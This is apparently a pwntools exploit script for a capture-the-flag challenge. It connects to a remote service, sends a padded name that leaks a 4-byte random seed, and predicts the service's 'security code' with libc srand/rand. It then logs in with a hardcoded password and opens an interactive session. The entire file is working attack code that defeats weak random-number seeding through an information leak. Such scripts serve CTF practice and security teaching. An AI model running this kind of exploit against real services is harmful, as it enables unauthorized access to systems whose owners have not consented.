from pwn import *
from ctypes import cdll
context(arch='amd64', os='linux',log_level='debug')
#s=process("../dist/pwn")
s=remote("192.168.3.253",51001)
clib=cdll.LoadLibrary("../dist/libc.so.6")

if __name__=="__main__":
    #sleep(5)
    s.sendafter(b"Name: ",b"admin".ljust(0x20,b"a"))
    s.sendafter(b"Password: ",b"1s_7h1s_p9ss_7tuIy_sAf3?")
    s.recvuntil(b"admin".ljust(0x20,b"a"))
    seed=u32(s.recv(4))
    clib.srand(seed)
    arg1=clib.rand()^0xd0e0a0d0
    info(hex(arg1))
    arg2=clib.rand()^0x0b0e0e0f
    info(hex(arg2))
    chal=(arg1^arg2)%1000000
    info(hex(chal))
    s.sendlineafter(b"Wanna see it?",b"y")
    s.sendlineafter(b"Input the security code to continue: ",str(chal).encode())
    s.interactive()
